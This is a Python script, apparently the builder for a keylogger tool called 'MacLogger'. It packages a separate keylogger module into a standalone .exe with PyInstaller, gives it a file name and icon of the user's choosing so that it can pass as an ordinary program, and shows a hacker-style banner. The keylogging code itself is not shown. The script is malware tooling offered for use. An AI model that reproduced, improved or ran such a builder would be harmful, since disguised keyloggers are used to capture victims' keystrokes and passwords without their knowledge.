#!/usr/bin/python

from pathlib import Path
import subprocess
from argparse import ArgumentParser
from termcolor import cprint

import main

downloads_path = str(Path.home() / "Downloads")


def print_banner(title):
    cprint("""

        \/\                   /\/
       \/  \_________________/_ \/
      \/   ___________________   \/
     \/   |                  |    \/
    \/    |    ___     ___   |     \/
   (     |   |   |   |   |   |      )
   |     |   |___|   |___|   |      |     
   |     |                   |      |
   |     |         /\        |      |
   |     |        /__\       |      |
   |     |                   |      |
   |     |     \         /   |      |
   (     |      \_______/    |      ) 
    \    |___________________|     /   
     \                           /    
      \_________________________/
""", color="red")
    total_len = 80
    if title:
        padding = total_len - len(title) - 4
        cprint("{} {}\n".format(title, "=" * padding), color="green")
    else:
        cprint("{}\n".format("=" * total_len), color="green")


def argParser():
    parser = ArgumentParser(description="MacLogger Tool [option] ", usage="python3 keylogger.py --help",
                            epilog="[ Manual Mode ] python3 main.py -n [Preferred File Name] "
                                   "-i [Preferred File Icon]")

    rparser = parser.add_argument_group("Required Arguments:")

    rparser.add_argument("-n", "--name", dest="fileName", help="Generated .exe File Name")
    rparser.add_argument("-i", "--icon", dest="fileIcon", help="Generated .exe Icon Path (.ico)")

    args = parser.parse_args()
    return args


def fileCreator(fileName, fileIcon):
    print(subprocess.call(["pyinstaller", "main.py", "--onefile", "--name", fileName, "--icon", fileIcon], shell=True))
    print(subprocess.call(["mkdir", fileName], shell=True))
    print(subprocess.call(["move", "dist", fileName], shell=True))
    print(subprocess.call(["move", "build", fileName], shell=True))
    print(subprocess.call(["move", fileName, downloads_path], shell=True))
    print("[+] success! \nFile saved to Downloads/" + fileName + "/dist Folder")

def start():
    if (argParser().fileName) and (argParser().fileIcon):
        fileCreator(argParser().fileName, argParser().fileIcon)
    else:
        print(subprocess.call(["python", "keylogger.py", "--h"], shell=True))



print_banner("WELCOME TO THE OTHER SIDE!:)\nBuilt by [markagugo --> github]")
start()
